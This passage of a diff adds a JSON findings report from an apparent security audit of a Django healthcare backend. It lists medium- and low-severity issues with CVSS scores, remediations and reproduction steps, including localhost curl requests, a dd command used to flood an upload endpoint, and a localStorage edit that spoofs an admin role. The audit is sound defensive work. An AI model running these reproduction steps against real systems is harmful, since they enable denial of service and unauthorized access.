+      "cwe_primary": "CWE-319",
+      "vuln_class": "transport_security",
+      "owasp": "A02:2021",
+      "method": "POST",
+      "endpoint": "/api/auth/forgot-password/",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "medicare/settings.py:127-133",
+      "affected_endpoint": "POST /api/auth/forgot-password/ (email delivery)",
+      "auth_required": false,
+      "description": "EMAIL_USE_TLS = False on port 1025. Password-reset tokens (utils.py:34) traverse network unencrypted, interceptable on-path for pre-auth account takeover.",
+      "impact": "Pre-auth account takeover via intercepted password reset tokens.",
+      "reproduction": {
+        "steps": [
+          "Inspect settings.py — EMAIL_USE_TLS = False on port 1025",
+          "Trigger password reset — email sent in cleartext"
+        ],
+        "curl": "N/A — network-level issue"
+      },
+      "remediation": "Set EMAIL_USE_TLS = True with proper SMTP server on port 587."
+    },
+    {
+      "id": "M-09",
+      "title": "Container runs as root with no USER directive",
+      "severity": "Medium",
+      "cvss_score": 5.3,
+      "cvss_vector": "AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+      "cwe": ["CWE-250"],
+      "cwe_primary": "CWE-250",
+      "vuln_class": "misconfiguration",
+      "owasp": "A05:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "Dockerfile",
+      "affected_endpoint": "All endpoints (container security)",
+      "auth_required": false,
+      "description": "No USER directive in Dockerfile. Process runs as uid 0. Every file-write and code-execution primitive (C-03) inherits root privileges. gcc left installed in final image for post-exploitation.",
+      "impact": "Any code execution runs as root. Path traversal (C-03) can write to /etc/cron.d, /etc/passwd, or any system path. Container escape easier from root.",
+      "reproduction": {
+        "steps": [
+          "Inspect Dockerfile — no USER directive",
+          "docker exec <container> id — returns uid=0(root)"
+        ],
+        "curl": "N/A — container configuration"
+      },
+      "remediation": "Add non-root user: RUN adduser --disabled-password appuser && USER appuser. Remove gcc via multi-stage build."
+    },
+    {
+      "id": "M-10",
+      "title": "No audit logging of authentication or PHI access events",
+      "severity": "Medium",
+      "cvss_score": 5.3,
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+      "cwe": ["CWE-778"],
+      "cwe_primary": "CWE-778",
+      "vuln_class": "missing_controls",
+      "owasp": "A09:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": false,
+      "best_verification": "verified-config",
+      "affected_component": "Entire backend (no LOGGING config, no logger, no security event recording)",
+      "affected_endpoint": "All endpoints (no audit trail)",
+      "auth_required": false,
+      "description": "No LOGGING config, no logger, no security-event recording anywhere. Authentication, PHI access, privilege changes, and prescription approvals all unlogged. Nothing to detect or reconstruct exploitation.",
+      "impact": "HIPAA 164.312(b) audit-controls failure. No forensic trail for incident response. Active exploitation goes undetected.",
+      "reproduction": {
+        "steps": [
+          "Grep entire backend for 'logger' or 'logging' — no results",
+          "Exploit any vulnerability — no log entry created"
+        ],
+        "curl": "N/A — absence of controls"
+      },
+      "remediation": "Configure Django LOGGING with structured output. Log all auth events, PHI access, privilege changes, prescription approvals."
+    },
+    {
+      "id": "M-11",
+      "title": "Unbounded upload size enables disk exhaustion",
+      "severity": "Medium",
+      "cvss_score": 5.3,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+      "cwe": ["CWE-400", "CWE-770"],
+      "cwe_primary": "CWE-400",
+      "vuln_class": "resource_exhaustion",
+      "owasp": "A04:2021",
+      "method": "POST",
+      "endpoint": "/api/patients/{id}/lab-results/",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "patients/lab_import_views.py:108-119",
+      "affected_endpoint": "POST /api/patients/{id}/lab-results/",
+      "auth_required": true,
+      "description": "Lab upload streams to disk with no size cap. FILE_UPLOAD_MAX_MEMORY_SIZE/DATA_UPLOAD_MAX_MEMORY_SIZE are memory-spill thresholds, not size limits — don't apply to file uploads. File then re-read line-by-line.",
+      "impact": "Disk exhaustion DoS. Any authenticated user fills container disk with arbitrarily large uploads.",
+      "reproduction": {
+        "steps": [
+          "Generate large file: dd if=/dev/zero of=big.csv bs=1M count=500",
+          "POST /api/patients/1/lab-results/ with file=@big.csv — accepted without size check"
+        ],
+        "curl": "curl -s -X POST -H \"Authorization: Bearer $TOK\" -F 'file=@big.csv' http://localhost:18001/api/patients/1/lab-results/"
+      },
+      "remediation": "Add explicit file size validation in view (check request.FILES['file'].size). Set reasonable limit (e.g. 10MB)."
+    },
+    {
+      "id": "L-01",
+      "title": "Plaintext passwords printed to container logs via seed script",
+      "severity": "Low",
+      "cvss_score": 3.7,
+      "cvss_vector": "AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+      "cwe": ["CWE-532"],
+      "cwe_primary": "CWE-532",
+      "vuln_class": "information_disclosure",
+      "owasp": "A09:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "seed.py:24",
+      "affected_endpoint": "N/A (container startup)",
+      "auth_required": false,
+      "description": "print(f'[Seed] Created user: {email} / {password}') writes plaintext passwords to container stdout / log aggregation.",
+      "impact": "Credential disclosure via log aggregation. Anyone with container log access reads plaintext credentials.",
+      "reproduction": {
+        "steps": [
+          "docker logs <container> — plaintext passwords visible in seed output"
+        ],
+        "curl": "N/A — log-level issue"
+      },
+      "remediation": "Remove password from log output: print(f'[Seed] Created user: {email}')."
+    },
+    {
+      "id": "L-02",
+      "title": "Client-side-only admin route guard (UI-level bypass)",
+      "severity": "Low",
+      "cvss_score": 3.1,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+      "cwe": ["CWE-602"],
+      "cwe_primary": "CWE-602",
+      "vuln_class": "client_side_enforcement",
+      "owasp": "A01:2021",
+      "method": "GET",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-poc",
+      "affected_component": "App.jsx:98-103",
+      "affected_endpoint": "Client-side admin routes",
+      "auth_required": true,
+      "description": "ProtectedRoute adminOnly trusts user.role from localStorage. Editing it renders admin UI. Backend (views.py:179,196) does enforce correctly, so impact is UI-only.",
+      "impact": "UI-level information disclosure. Non-admin sees admin dashboard layout, but API calls still enforce server-side authorization.",
+      "reproduction": {
+        "steps": [
+          "Login as user@app.local",
+          "Modify localStorage user object to set role='admin'",
+          "Admin routes render in UI"
+        ],
+        "curl": "N/A — client-side issue"
+      },
+      "remediation": "Verify role via API call instead of trusting localStorage."
+    },
+    {
+      "id": "L-03",
+      "title": "CORS_ALLOW_CREDENTIALS with localhost origins",
+      "severity": "Low",
+      "cvss_score": 3.1,
+      "cvss_vector": "AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
+      "cwe": ["CWE-942"],
+      "cwe_primary": "CWE-942",
+      "vuln_class": "misconfiguration",
+      "owasp": "A05:2021",
+      "method": "ANY",
+      "endpoint": "/*",
+      "exploitable": true,
+      "best_verification": "verified-config",
+      "affected_component": "settings.py:102-107",
+      "affected_endpoint": "All endpoints (CORS headers)",
+      "auth_required": false,
+      "description": "CORS_ALLOW_CREDENTIALS = True with localhost origins allowlisted. Harmless in prod as written, but a dev-origin foothold becomes a cross-origin credentialed path.",
+      "impact": "In dev/shared environment, attacker on localhost:3000 makes credentialed cross-origin requests. Low impact in production.",
+      "reproduction": {
+        "steps": [
+          "Inspect settings.py — CORS_ALLOW_CREDENTIALS = True with localhost origins"
+        ],
+        "curl": "curl -s -H 'Origin: http://localhost:3000' -I http://localhost:18001/api/health/ | grep -i access-control"
+      },
+      "remediation": "Remove localhost origins from CORS_ALLOWED_ORIGINS in production."
+    },
+    {
+      "id": "L-04",
+      "title": "Missing /api/auth/token/refresh/ endpoint breaks token refresh flow",
+      "severity": "Low",
+      "cvss_score": 2.7,
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L",
+      "cwe": ["CWE-16"],
+      "cwe_primary": "CWE-16",
+      "vuln_class": "misconfiguration",
+      "owasp": "A05:2021",
+      "method": "POST",
+      "endpoint": "/api/auth/token/refresh/",
+      "exploitable": false,
+      "best_verification": "verified-config",
+      "affected_component": "client.js:29",
+      "affected_endpoint": "POST /api/auth/token/refresh/",
+      "auth_required": true,
+      "description": "client.js:29 POSTs to /api/auth/token/refresh/ which is not registered in auth_app/urls.py. Every refresh 404s and force-logs-out the user. Availability/robustness issue, not exploitable.",
+      "impact": "Users force-logged-out when access token expires. Degrades UX but not directly exploitable.",
+      "reproduction": {
+        "steps": [
+          "Login and wait for access token expiry",
+          "client.js attempts POST /api/auth/token/refresh/ — returns 404",
+          "User force-logged-out"
+        ],
+        "curl": "curl -s -X POST http://localhost:18001/api/auth/token/refresh/ -H 'Content-Type: application/json' -d '{\"refresh\":\"<token>\"}'"
+      },
+      "remediation": "Add refresh endpoint to auth_app/urls.py: path('token/refresh/', TokenRefreshView.as_view())."
+    }
+  ]
+}
